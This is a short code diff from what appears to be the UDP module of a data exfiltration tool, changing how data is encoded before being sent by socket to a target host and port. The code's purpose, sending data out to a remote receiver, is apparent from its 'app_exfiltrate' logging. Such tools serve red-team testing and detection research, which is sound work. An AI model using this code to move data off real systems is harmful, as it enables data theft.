@@ -11,7 +11,7 @@ def send(data):
     app_exfiltrate.log_message(
         'info', "[udp] Sending {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    client_socket.sendto(data.encode('hex'), (target, port))
+    client_socket.sendto(data.encode(), (target, port))
 
 
 def listen():
